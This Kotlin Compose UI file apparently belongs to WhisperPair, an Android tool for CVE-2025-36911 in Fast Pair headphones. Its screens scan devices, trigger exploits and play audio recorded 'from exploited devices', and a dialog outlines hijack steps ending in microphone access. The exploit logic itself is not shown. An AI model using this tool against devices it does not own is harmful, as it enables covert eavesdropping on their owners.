                        mediaPlayer = null
                        true
                    }
                    prepare()
                    start()
                }
                mediaPlayer = player
            } catch (e: Exception) {
                playingFile = null
            }
        } else {
            // Use AudioTrack for raw PCM files
            thread {
                try {
                    val bufferSize = AudioTrack.getMinBufferSize(16000, AudioFormat.CHANNEL_OUT_MONO, AudioFormat.ENCODING_PCM_16BIT)
                    val track = AudioTrack.Builder()
                        .setAudioAttributes(AudioAttributes.Builder().setUsage(AudioAttributes.USAGE_MEDIA).setContentType(AudioAttributes.CONTENT_TYPE_SPEECH).build())
                        .setAudioFormat(AudioFormat.Builder().setEncoding(AudioFormat.ENCODING_PCM_16BIT).setSampleRate(16000).setChannelMask(AudioFormat.CHANNEL_OUT_MONO).build())
                        .setBufferSizeInBytes(bufferSize)
                        .setTransferMode(AudioTrack.MODE_STREAM)
                        .build()
                    audioTrack = track
                    track.play()

                    FileInputStream(file).use { fis ->
                        val buffer = ByteArray(bufferSize)
                        var bytesRead: Int
                        while (fis.read(buffer).also { bytesRead = it } != -1 && playingFile == file.absolutePath) {
                            track.write(buffer, 0, bytesRead)
                        }
                    }
                    track.stop()
                    track.release()
                    playingFile = null
                } catch (e: Exception) {
                    playingFile = null
                }
            }
        }
    }

    fun shareFile(file: File) {
        val uri = FileProvider.getUriForFile(context, "${context.packageName}.provider", file)
        val intent = Intent(Intent.ACTION_SEND).apply {
            type = "audio/*"
            putExtra(Intent.EXTRA_STREAM, uri)
            addFlags(Intent.FLAG_GRANT_READ_URI_PERMISSION)
        }
        context.startActivity(Intent.createChooser(intent, "Share recording"))
    }

    fun deleteFile(file: File) {
        stopPlaying()
        file.delete()
        refreshRecordings()
    }

    Column(modifier = Modifier.fillMaxSize().padding(paddingValues).padding(horizontal = 16.dp)) {
        Row(modifier = Modifier.fillMaxWidth().padding(vertical = 16.dp), verticalAlignment = Alignment.CenterVertically) {
            Icon(Icons.Default.Audiotrack, null, tint = CyanPrimary, modifier = Modifier.size(28.dp))
            Spacer(Modifier.width(12.dp))
            Text("Recordings", fontWeight = FontWeight.Bold, fontSize = 20.sp, color = TextPrimary)
            Spacer(Modifier.weight(1f))
            IconButton(onClick = { refreshRecordings() }) {
                Icon(Icons.Default.Refresh, "Refresh", tint = TextSecondary)
            }
        }

        if (recordings.isEmpty()) {
            Card(modifier = Modifier.fillMaxWidth(), colors = CardDefaults.cardColors(containerColor = DarkSurface), shape = RoundedCornerShape(16.dp)) {
                Column(modifier = Modifier.fillMaxWidth().padding(32.dp), horizontalAlignment = Alignment.CenterHorizontally) {
                    Icon(Icons.Default.AudioFile, null, tint = TextSecondary, modifier = Modifier.size(64.dp))
                    Spacer(Modifier.height(16.dp))
                    Text("No recordings yet", style = MaterialTheme.typography.titleMedium, color = TextPrimary)
                    Text("Use the Scanner tab to record audio from exploited devices", style = MaterialTheme.typography.bodySmall, color = TextSecondary, textAlign = TextAlign.Center)
                }
            }
        } else {
            LazyColumn(verticalArrangement = Arrangement.spacedBy(8.dp)) {
                items(recordings) { file ->
                    val isPlaying = playingFile == file.absolutePath
                    val dateFormat = SimpleDateFormat("MMM dd, yyyy HH:mm", Locale.US)
                    val date = dateFormat.format(Date(file.lastModified()))
                    val sizeKb = file.length() / 1024

                    Card(modifier = Modifier.fillMaxWidth(), colors = CardDefaults.cardColors(containerColor = DarkSurface), shape = RoundedCornerShape(12.dp)) {
                        Row(modifier = Modifier.fillMaxWidth().padding(12.dp), verticalAlignment = Alignment.CenterVertically) {
                            Box(
                                modifier = Modifier.size(48.dp).clip(CircleShape).background(if (isPlaying) PatchedGreen.copy(alpha = 0.2f) else CyanPrimary.copy(alpha = 0.15f)),
                                contentAlignment = Alignment.Center
                            ) {
                                Icon(if (isPlaying) Icons.Default.GraphicEq else Icons.Default.AudioFile, null, tint = if (isPlaying) PatchedGreen else CyanPrimary, modifier = Modifier.size(24.dp))
                            }
                            Spacer(Modifier.width(12.dp))
                            Column(modifier = Modifier.weight(1f)) {
                                Text(file.name, style = MaterialTheme.typography.bodyMedium, fontWeight = FontWeight.Medium, color = TextPrimary, maxLines = 1, overflow = TextOverflow.Ellipsis)
                                Text("$date • ${sizeKb}KB", style = MaterialTheme.typography.bodySmall, color = TextSecondary)
                            }
                            IconButton(onClick = { if (isPlaying) stopPlaying() else playFile(file) }) {
                                Icon(if (isPlaying) Icons.Default.Stop else Icons.Default.PlayArrow, null, tint = if (isPlaying) VulnerableRed else PatchedGreen)
                            }
                            IconButton(onClick = { shareFile(file) }) {
                                Icon(Icons.Default.Share, "Share", tint = CyanPrimary)
                            }
                            IconButton(onClick = { deleteFile(file) }) {
                                Icon(Icons.Default.Delete, "Delete", tint = VulnerableRed)
                            }
                        }
                    }
                }
                item { Spacer(Modifier.height(8.dp)) }
            }
        }
    }
}

@Composable
fun ScanControlCard(isScanning: Boolean, deviceCount: Int, onToggleScan: () -> Unit) {
    val infiniteTransition = rememberInfiniteTransition(label = "scan")
    val rotation by infiniteTransition.animateFloat(0f, 360f, infiniteRepeatable(tween(2000, easing = LinearEasing), RepeatMode.Restart), label = "rotation")
    val pulse by infiniteTransition.animateFloat(1f, 1.2f, infiniteRepeatable(tween(1000), RepeatMode.Reverse), label = "pulse")

    Card(modifier = Modifier.fillMaxWidth(), colors = CardDefaults.cardColors(containerColor = DarkSurface), shape = RoundedCornerShape(16.dp)) {
        Row(modifier = Modifier.fillMaxWidth().padding(16.dp), verticalAlignment = Alignment.CenterVertically, horizontalArrangement = Arrangement.spacedBy(12.dp)) {
            Row(verticalAlignment = Alignment.CenterVertically, modifier = Modifier.weight(1f)) {
                Box(modifier = Modifier.size(48.dp).clip(CircleShape).background(if (isScanning) CyanPrimary.copy(alpha = 0.2f) else DarkSurfaceVariant), contentAlignment = Alignment.Center) {
                    Icon(Icons.AutoMirrored.Filled.BluetoothSearching, null, tint = if (isScanning) CyanPrimary else TextSecondary, modifier = Modifier.size(24.dp).then(if (isScanning) Modifier.rotate(rotation) else Modifier))
                }
                Spacer(Modifier.width(12.dp))
                Column(modifier = Modifier.weight(1f)) {
                    Text(if (isScanning) "Scanning..." else "Ready to Scan", style = MaterialTheme.typography.titleSmall, fontWeight = FontWeight.SemiBold, color = TextPrimary, maxLines = 1)
                    Text(if (isScanning) "Looking for Fast Pair devices" else "Tap to discover nearby devices", style = MaterialTheme.typography.bodySmall, color = TextSecondary, maxLines = 1)
                }
            }
            Button(onClick = onToggleScan, colors = ButtonDefaults.buttonColors(containerColor = if (isScanning) VulnerableRed else CyanPrimary), shape = RoundedCornerShape(12.dp), modifier = if (isScanning) Modifier.scale(pulse) else Modifier) {
                Icon(if (isScanning) Icons.Default.Stop else Icons.Default.PlayArrow, null, Modifier.size(20.dp))
                Spacer(Modifier.width(4.dp))
                Text(if (isScanning) "Stop" else "Scan")
            }
        }
    }
}

@Composable
fun DeviceCard(
    device: FastPairDevice,
    exploitResult: String?,
    onTest: () -> Unit,
    onExploit: () -> Unit
) {
    val statusColor by animateColorAsState(
        when (device.status) {
            DeviceStatus.VULNERABLE -> VulnerableRed
            DeviceStatus.PATCHED -> PatchedGreen
            DeviceStatus.TESTING -> TestingBlue
            DeviceStatus.ERROR -> WarningOrange
            DeviceStatus.NOT_TESTED -> TextSecondary
        }, label = "statusColor"
    )

    var showMagicDialog by remember { mutableStateOf(false) }

    Card(
        modifier = Modifier.fillMaxWidth().then(if (device.status == DeviceStatus.VULNERABLE) Modifier.border(1.dp, VulnerableRed.copy(alpha = 0.5f), RoundedCornerShape(12.dp)) else Modifier),
        colors = CardDefaults.cardColors(containerColor = DarkSurface),
        shape = RoundedCornerShape(12.dp)
    ) {
        Column(modifier = Modifier.padding(16.dp)) {
            Row(modifier = Modifier.fillMaxWidth(), horizontalArrangement = Arrangement.SpaceBetween, verticalAlignment = Alignment.Top) {
                Row(modifier = Modifier.weight(1f), verticalAlignment = Alignment.CenterVertically) {
                    Box(modifier = Modifier.size(44.dp).clip(CircleShape).background(statusColor.copy(alpha = 0.15f)), contentAlignment = Alignment.Center) {
                        Icon(if (device.isFastPair) Icons.Default.Headphones else Icons.Default.Bluetooth, null, tint = statusColor, modifier = Modifier.size(24.dp))
                    }
                    Spacer(Modifier.width(12.dp))
                    Column(modifier = Modifier.weight(1f)) {
                        Text(device.displayName, style = MaterialTheme.typography.titleSmall, fontWeight = FontWeight.SemiBold, color = TextPrimary, maxLines = 1, overflow = TextOverflow.Ellipsis)
                        device.manufacturer?.let { Text(it, style = MaterialTheme.typography.bodySmall, color = TextSecondary) }
                        Text(device.address, style = MaterialTheme.typography.labelSmall, color = TextTertiary, fontFamily = FontFamily.Monospace)
                    }
                }
                StatusBadge(device.status)
            }

            Spacer(Modifier.height(12.dp))

            Row(modifier = Modifier.fillMaxWidth(), horizontalArrangement = Arrangement.SpaceBetween, verticalAlignment = Alignment.CenterVertically) {
                Row(horizontalArrangement = Arrangement.spacedBy(8.dp)) {
                    InfoChip(when (device.signalStrength) { SignalStrength.EXCELLENT, SignalStrength.GOOD -> Icons.Default.NetworkWifi; SignalStrength.FAIR -> Icons.Default.Wifi; else -> Icons.Default.WifiOff }, "${device.rssi} dBm", when (device.signalStrength) { SignalStrength.EXCELLENT, SignalStrength.GOOD -> SignalStrong; SignalStrength.FAIR -> SignalMedium; else -> SignalWeak })
                    if (device.isFastPair) {
                        InfoChip(if (device.isPairingMode) Icons.Default.Link else Icons.Default.LinkOff, if (device.isPairingMode) "Pairing" else "Idle", if (device.isPairingMode) TestingBlue else TextSecondary)
                    } else {
                        InfoChip(Icons.Default.Bluetooth, "BLE", TextSecondary)
                    }
                }
                Row(horizontalArrangement = Arrangement.spacedBy(4.dp)) {
                    if (!device.isPairingMode && device.status != DeviceStatus.TESTING && device.status != DeviceStatus.VULNERABLE) {
                        IconButton(
                            onClick = onExploit,
                            modifier = Modifier.size(32.dp)
                        ) {
                            Icon(Icons.Default.AutoAwesome, null, tint = VulnerableRed, modifier = Modifier.size(18.dp))
                        }
                    }
                    if (!device.isPairingMode && device.status != DeviceStatus.TESTING && (device.status == DeviceStatus.NOT_TESTED || device.status == DeviceStatus.ERROR)) {
                        FilledTonalButton(onClick = onTest, colors = ButtonDefaults.filledTonalButtonColors(containerColor = CyanPrimary.copy(alpha = 0.2f), contentColor = CyanPrimary), contentPadding = PaddingValues(horizontal = 12.dp, vertical = 6.dp), modifier = Modifier.height(32.dp)) {
                        Icon(Icons.Default.PlayArrow, null, Modifier.size(16.dp))
                        Spacer(Modifier.width(4.dp))
                        Text("Test", fontSize = 12.sp)
                    }
                    }
                    if (device.status == DeviceStatus.TESTING) {
                        Row(verticalAlignment = Alignment.CenterVertically) {
                            CircularProgressIndicator(Modifier.size(16.dp), strokeWidth = 2.dp, color = TestingBlue)
                            Spacer(Modifier.width(8.dp))
                            Text("Testing...", fontSize = 12.sp, color = TestingBlue)
                        }
                    }
                }
            }

            if (device.isPairingMode) {
                Spacer(Modifier.height(8.dp))
                Row(modifier = Modifier.fillMaxWidth().clip(RoundedCornerShape(8.dp)).background(TestingBlue.copy(alpha = 0.1f)).padding(8.dp), verticalAlignment = Alignment.CenterVertically) {
                    Icon(Icons.Default.Info, null, tint = TestingBlue, modifier = Modifier.size(16.dp))
                    Spacer(Modifier.width(8.dp))
                    Text("Device in pairing mode - test not applicable", style = MaterialTheme.typography.labelSmall, color = TestingBlue)
                }
            }

            // Exploit progress display (shown for all devices during/after quick exploit)
            exploitResult?.let { result ->
                Spacer(Modifier.height(8.dp))
                val bgColor = when { result.startsWith("PAIRED") || result.startsWith("KEY") -> PatchedGreen; result.startsWith("PARTIAL") -> WarningOrange; result.startsWith("FAILED") -> VulnerableRed; else -> CyanPrimary }
                Row(modifier = Modifier.fillMaxWidth().clip(RoundedCornerShape(8.dp)).background(bgColor.copy(alpha = 0.15f)).padding(10.dp), verticalAlignment = Alignment.CenterVertically) {
                    Icon(when { result.startsWith("PAIRED") || result.startsWith("KEY") -> Icons.Default.CheckCircle; result.startsWith("PARTIAL") -> Icons.Default.Warning; result.startsWith("FAILED") -> Icons.Default.Error; else -> Icons.Default.Sync }, null, tint = bgColor, modifier = Modifier.size(16.dp))
                    Spacer(Modifier.width(8.dp))
                    Text(result, style = MaterialTheme.typography.labelSmall, color = TextPrimary, maxLines = 2, overflow = TextOverflow.Ellipsis)
                }
            }

            // Vulnerable device controls
            if (device.status == DeviceStatus.VULNERABLE) {
                Spacer(Modifier.height(12.dp))

                val isOperating = exploitResult?.let { it.startsWith("Connecting") || it.startsWith("Writing") || it.startsWith("Flooding") } == true

                // Magic button
                Button(onClick = { showMagicDialog = true }, modifier = Modifier.fillMaxWidth(), colors = ButtonDefaults.buttonColors(containerColor = VulnerableRed), enabled = !isOperating) {
                    Icon(Icons.Default.AutoAwesome, null, Modifier.size(18.dp))
                    Spacer(Modifier.width(8.dp))
                    Text("Magic - Pair Device", fontWeight = FontWeight.Bold)
                }
            }
        }
    }

    if (showMagicDialog) {
        AlertDialog(
            onDismissRequest = { showMagicDialog = false },
            icon = { Icon(Icons.Default.Warning, null, tint = VulnerableRed, modifier = Modifier.size(48.dp)) },
            title = { Text("Exploit Vulnerable Device?", fontWeight = FontWeight.Bold) },
            text = {
                Column {
                    Text("This will attempt to:")
                    Spacer(Modifier.height(8.dp))
                    BulletPoint("Perform Fast Pair Key-Based Pairing")
                    BulletPoint("Extract BR/EDR address")
                    BulletPoint("Initiate Bluetooth Classic bonding")
                    BulletPoint("Write Account Key for persistence")
                    Spacer(Modifier.height(12.dp))
                    Text("After success, use 'Connect Audio' for microphone access.", style = MaterialTheme.typography.bodySmall, color = CyanPrimary)
                    Spacer(Modifier.height(8.dp))
                    Text("Only test devices you own!", style = MaterialTheme.typography.bodySmall, color = VulnerableRed, fontWeight = FontWeight.SemiBold)
                }
            },
            confirmButton = { Button(onClick = { showMagicDialog = false; onExploit() }, colors = ButtonDefaults.buttonColors(containerColor = VulnerableRed)) { Text("Execute") } },
            dismissButton = { TextButton(onClick = { showMagicDialog = false }) { Text("Cancel", color = TextSecondary) } },
            containerColor = DarkSurface
        )
    }
}

@Composable
fun InfoChip(icon: ImageVector, text: String, color: Color) {
    Row(verticalAlignment = Alignment.CenterVertically, modifier = Modifier.clip(RoundedCornerShape(4.dp)).background(color.copy(alpha = 0.1f)).padding(horizontal = 6.dp, vertical = 2.dp)) {
        Icon(icon, null, tint = color, modifier = Modifier.size(12.dp))
        Spacer(Modifier.width(4.dp))
        Text(text, style = MaterialTheme.typography.labelSmall, color = color)
    }
}

@Composable
fun StatusBadge(status: DeviceStatus) {
    val infiniteTransition = rememberInfiniteTransition(label = "status")
    val alpha by infiniteTransition.animateFloat(0.7f, 1f, infiniteRepeatable(tween(500), RepeatMode.Reverse), label = "alpha")
    val (text, color, icon) = when (status) {
        DeviceStatus.NOT_TESTED -> Triple("Not Tested", TextSecondary, Icons.AutoMirrored.Outlined.HelpOutline)
        DeviceStatus.TESTING -> Triple("Testing", TestingBlue, Icons.Default.Sync)
        DeviceStatus.VULNERABLE -> Triple("VULNERABLE", VulnerableRed, Icons.Default.Warning)
        DeviceStatus.PATCHED -> Triple("Patched", PatchedGreen, Icons.Default.CheckCircle)
        DeviceStatus.ERROR -> Triple("Error", WarningOrange, Icons.Default.Error)
    }
    Surface(color = color.copy(alpha = if (status == DeviceStatus.VULNERABLE) alpha * 0.2f else 0.15f), shape = RoundedCornerShape(8.dp)) {
        Row(modifier = Modifier.padding(horizontal = 8.dp, vertical = 4.dp), verticalAlignment = Alignment.CenterVertically) {
            Icon(icon, null, tint = if (status == DeviceStatus.VULNERABLE) color.copy(alpha = alpha) else color, modifier = Modifier.size(14.dp))
            Spacer(Modifier.width(4.dp))
            Text(text, color = if (status == DeviceStatus.VULNERABLE) color.copy(alpha = alpha) else color, style = MaterialTheme.typography.labelSmall, fontWeight = FontWeight.SemiBold)
        }
    }
}

@Composable
fun EmptyStateCard(isScanning: Boolean) {
    Card(modifier = Modifier.fillMaxWidth(), colors = CardDefaults.cardColors(containerColor = DarkSurface), shape = RoundedCornerShape(16.dp)) {
        Column(modifier = Modifier.fillMaxWidth().padding(32.dp), horizontalAlignment = Alignment.CenterHorizontally) {
            Icon(if (isScanning) Icons.AutoMirrored.Filled.BluetoothSearching else Icons.Default.BluetoothDisabled, null, tint = TextSecondary, modifier = Modifier.size(64.dp))
            Spacer(Modifier.height(16.dp))
            Text(if (isScanning) "Searching..." else "No devices", style = MaterialTheme.typography.titleMedium, color = TextPrimary, textAlign = TextAlign.Center)
            Text(if (isScanning) "Looking for Fast Pair devices" else "Start scanning to discover devices", style = MaterialTheme.typography.bodySmall, color = TextSecondary, textAlign = TextAlign.Center)
        }
    }
}

@Composable
fun DisclaimerDialog(onAccept: () -> Unit) {
    AlertDialog(
        onDismissRequest = { },
        icon = { Icon(Icons.Default.Security, null, tint = CyanPrimary, modifier = Modifier.size(48.dp)) },
        title = { Text("Security Research Tool", textAlign = TextAlign.Center, fontWeight = FontWeight.Bold) },
        text = {
            Column {
                Text("WhisperPair is a DEFENSIVE security tool for CVE-2025-36911 vulnerability testing.")
                Spacer(Modifier.height(12.dp))
                BulletPoint("Only test devices you own or have permission to test")
                BulletPoint("Helps identify devices needing firmware updates")
                BulletPoint("For security research purposes only")
                Spacer(Modifier.height(12.dp))
                Text("By using this tool, you agree to use it responsibly.", style = MaterialTheme.typography.bodySmall, color = TextSecondary)
            }
        },
        confirmButton = { Button(onClick = onAccept, colors = ButtonDefaults.buttonColors(containerColor = CyanPrimary)) { Text("I Understand") } },
        containerColor = DarkSurface
    )
}

@Composable
fun BulletPoint(text: String) {
    Row(modifier = Modifier.padding(vertical = 2.dp)) {
        Text("• ", color = CyanPrimary)
        Text(text, style = MaterialTheme.typography.bodySmall)
    }
}

@Composable
fun AboutDialog(onDismiss: () -> Unit) {
    val uriHandler = LocalUriHandler.current
    val scrollState = rememberScrollState()

    AlertDialog(
        onDismissRequest = onDismiss,
        title = {
            Column(horizontalAlignment = Alignment.CenterHorizontally, modifier = Modifier.fillMaxWidth()) {
                Image(
                    painter = painterResource(R.mipmap.ic_launcher_foreground),
                    contentDescription = "WhisperPair",
                    modifier = Modifier.size(72.dp)
                )
                Spacer(Modifier.height(8.dp))
                Text("WhisperPair v1.1", fontWeight = FontWeight.Bold)
                Text("CVE-2025-36911 Vulnerability Scanner", style = MaterialTheme.typography.bodySmall, color = TextSecondary)
            }
        },
        text = {
            Column(modifier = Modifier.verticalScroll(scrollState)) {
                // Developer
                SectionHeader("Developer")
                LinkRow("@ZalexDev", "https://github.com/zalexdev", uriHandler)

                Spacer(Modifier.height(8.dp))

                // Disclaimer
                Row(
                    modifier = Modifier
                        .fillMaxWidth()
                        .clip(RoundedCornerShape(8.dp))
                        .background(TextSecondary.copy(alpha = 0.1f))
                        .padding(10.dp),
                    verticalAlignment = Alignment.Top
                ) {
                    Icon(Icons.Default.Info, null, tint = TextSecondary, modifier = Modifier.size(16.dp))
                    Spacer(Modifier.width(8.dp))
                    Text(
                        "This is an independent implementation. The KU Leuven researchers discovered the vulnerability but have not released any code and are not affiliated with this project.",
                        style = MaterialTheme.typography.labelSmall,
                        color = TextSecondary
                    )
                }

                Spacer(Modifier.height(12.dp))

                // Links
                SectionHeader("Links")
                LinkRow("Latest Release", "https://github.com/zalexdev/whisper-pair-app", uriHandler)
                LinkRow("WhisperPair Website", "https://whisperpair.eu", uriHandler)
                LinkRow("CVE Entry", "https://www.cve.org/CVERecord?id=CVE-2025-36911", uriHandler)

                Spacer(Modifier.height(12.dp))

                // Support
                val context = LocalContext.current
                val clipboardManager = context.getSystemService(Context.CLIPBOARD_SERVICE) as android.content.ClipboardManager

                SectionHeader("Support Development")

                // Star on GitHub
                Row(
                    modifier = Modifier.fillMaxWidth().clip(RoundedCornerShape(8.dp)).background(CyanPrimary.copy(alpha = 0.1f)).clickable { uriHandler.openUri("https://github.com/zalexdev/whisper-pair-app") }.padding(10.dp),
                    verticalAlignment = Alignment.CenterVertically
                ) {
                    Icon(Icons.Default.Star, null, tint = CyanPrimary, modifier = Modifier.size(20.dp))
                    Spacer(Modifier.width(8.dp))
                    Column(modifier = Modifier.weight(1f)) {
                        Text("Star on GitHub", style = MaterialTheme.typography.labelMedium, fontWeight = FontWeight.SemiBold, color = CyanPrimary)
                        Text("Help others discover WhisperPair", style = MaterialTheme.typography.labelSmall, color = TextSecondary)
                    }
                    Icon(Icons.AutoMirrored.Filled.OpenInNew, null, tint = CyanPrimary, modifier = Modifier.size(16.dp))
                }

                Spacer(Modifier.height(8.dp))

                // TRC20 Donation
                Row(
                    modifier = Modifier.fillMaxWidth().clip(RoundedCornerShape(8.dp)).background(WarningOrange.copy(alpha = 0.1f)).clickable {
                        clipboardManager.setPrimaryClip(android.content.ClipData.newPlainText("TRC20 Address", "TXVt15poW3yTBb7zSdaBRuyFsGCpFyg8CU"))
                        Toast.makeText(context, "Address copied!", Toast.LENGTH_SHORT).show()
                    }.padding(10.dp),
                    verticalAlignment = Alignment.CenterVertically
                ) {
                    Icon(Icons.Default.AccountBalanceWallet, null, tint = WarningOrange, modifier = Modifier.size(20.dp))
                    Spacer(Modifier.width(8.dp))
                    Column(modifier = Modifier.weight(1f)) {
                        Text("TRC20 (USDT)", style = MaterialTheme.typography.labelSmall, color = WarningOrange)
                        Text("TXVt15poW3yTBb7zSdaBRuyFsGCpFyg8CU", style = MaterialTheme.typography.labelSmall, fontFamily = FontFamily.Monospace, color = TextPrimary)
                    }
                    Icon(Icons.Default.ContentCopy, null, tint = WarningOrange, modifier = Modifier.size(16.dp))
                }

                Spacer(Modifier.height(16.dp))

                // Research Team
                SectionHeader("Original Research Team")
                Text("KU Leuven, Belgium", style = MaterialTheme.typography.bodySmall, color = TextSecondary)
                Spacer(Modifier.height(8.dp))

                Text("COSIC Group:", style = MaterialTheme.typography.labelMedium, fontWeight = FontWeight.SemiBold, color = CyanPrimary)
                LinkRow("Sayon Duttagupta*", "https://www.esat.kuleuven.be/cosic/people/person/?u=u0129899", uriHandler)
                LinkRow("Nikola Antonijević", "https://www.esat.kuleuven.be/cosic/people/person/?u=u0148369", uriHandler)
                LinkRow("Bart Preneel", "https://homes.esat.kuleuven.be/~preneel/", uriHandler)

                Spacer(Modifier.height(4.dp))
                Text("DistriNet Group:", style = MaterialTheme.typography.labelMedium, fontWeight = FontWeight.SemiBold, color = CyanPrimary)
                LinkRow("Seppe Wyns*", "https://seppe.io", uriHandler)
                LinkRow("Dave Singelée", "https://sites.google.com/site/davesingelee", uriHandler)
                Text("* Primary authors", style = MaterialTheme.typography.labelSmall, color = TextTertiary)

                Spacer(Modifier.height(12.dp))

                // Resources
                SectionHeader("Resources")
                LinkRow("Vulnerable Devices List", "https://whisperpair.eu/vulnerable-devices", uriHandler)
                LinkRow("Demo Video", "https://www.youtube.com/watch?v=-j45ShJINtc", uriHandler)
                LinkRow("COSIC Research Group", "https://www.esat.kuleuven.be/cosic", uriHandler)

                Spacer(Modifier.height(12.dp))

                // Media
                SectionHeader("Media Coverage")
                LinkRow("WIRED", "https://www.wired.com/story/google-fast-pair-bluetooth-audio-accessories-vulnerability-patches/", uriHandler)
                LinkRow("9to5Google", "https://9to5google.com/2026/01/15/google-fast-pair-devices-exploit-whisperpair/", uriHandler)

                Spacer(Modifier.height(12.dp))

                // Funding
                Text("Original research funded by Flemish Government Cybersecurity Research Program (VOEWICS02)", style = MaterialTheme.typography.labelSmall, color = TextTertiary, textAlign = TextAlign.Center, modifier = Modifier.fillMaxWidth())
            }
        },
        confirmButton = { TextButton(onClick = onDismiss) { Text("Close", color = CyanPrimary) } },
        containerColor = DarkSurface
    )
}

@Composable
fun SectionHeader(text: String) {
    Text(text, style = MaterialTheme.typography.titleSmall, fontWeight = FontWeight.Bold, color = TextPrimary)
    Spacer(Modifier.height(4.dp))
}

@Composable
fun LinkRow(text: String, url: String, uriHandler: androidx.compose.ui.platform.UriHandler) {
    Row(modifier = Modifier.fillMaxWidth().clickable { uriHandler.openUri(url) }.padding(vertical = 4.dp), verticalAlignment = Alignment.CenterVertically) {
        Icon(Icons.AutoMirrored.Filled.OpenInNew, null, tint = CyanPrimary, modifier = Modifier.size(14.dp))
        Spacer(Modifier.width(8.dp))
        Text(text, style = MaterialTheme.typography.bodySmall, color = CyanPrimary)
    }
}

@OptIn(ExperimentalMaterial3Api::class)
@Composable
fun DebugLogDialog(
    logs: List<String>,
    onDismiss: () -> Unit,
    onClear: () -> Unit
) {
    AlertDialog(
        onDismissRequest = onDismiss,
        modifier = Modifier.fillMaxWidth().fillMaxHeight(0.85f),
        title = {
            Row(
                modifier = Modifier.fillMaxWidth(),
                verticalAlignment = Alignment.CenterVertically
            ) {
                Icon(Icons.Default.BugReport, null, tint = WarningOrange)
                Spacer(Modifier.width(8.dp))
                Text("Debug Logs", fontWeight = FontWeight.Bold, modifier = Modifier.weight(1f))
                Text("${logs.size} entries", style = MaterialTheme.typography.labelSmall, color = TextSecondary)
            }
        },
        text = {
            Column {
                Text(
                    "Root command execution logs. Tap an entry to copy.",
                    style = MaterialTheme.typography.bodySmall,
                    color = TextSecondary
                )
                Spacer(Modifier.height(8.dp))
                
                if (logs.isEmpty()) {
                    Box(
                        modifier = Modifier.fillMaxWidth().height(200.dp),
                        contentAlignment = Alignment.Center
                    ) {
                        Text("No logs yet. Try connecting HFP.", color = TextSecondary)
                    }
                } else {
                    LazyColumn(
                        modifier = Modifier
                            .fillMaxWidth()
                            .weight(1f)
                            .background(Color(0xFF1A1A1A), RoundedCornerShape(8.dp))
                            .padding(8.dp),
                        verticalArrangement = Arrangement.spacedBy(2.dp)
                    ) {
                        items(logs) { log ->
                            val isError = log.contains("\u274c")
                            val color = when {
                                isError -> VulnerableRed
                                log.contains("STDOUT") || log.contains("STDERR") || log.contains("RESULT") -> CyanPrimary
                                log.contains("\u2501") -> WarningOrange
                                else -> TextPrimary
                            }
                            Text(
                                text = log,
                                style = MaterialTheme.typography.labelSmall,
                                color = color,
                                fontFamily = androidx.compose.ui.text.font.FontFamily.Monospace,
                                modifier = Modifier.fillMaxWidth()
                            )
                        }
                    }
                }
            }
        },
        confirmButton = {
            Row {
                TextButton(onClick = onClear) {
                    Icon(Icons.Default.DeleteForever, null, tint = VulnerableRed, modifier = Modifier.size(18.dp))
                    Spacer(Modifier.width(4.dp))
                    Text("Clear", color = VulnerableRed)
                }
                Spacer(Modifier.width(8.dp))
                Button(
                    onClick = onDismiss,
                    colors = ButtonDefaults.buttonColors(containerColor = CyanPrimary)
                ) {
                    Text("Close")
                }
            }
        },
        containerColor = DarkSurface
    )
}
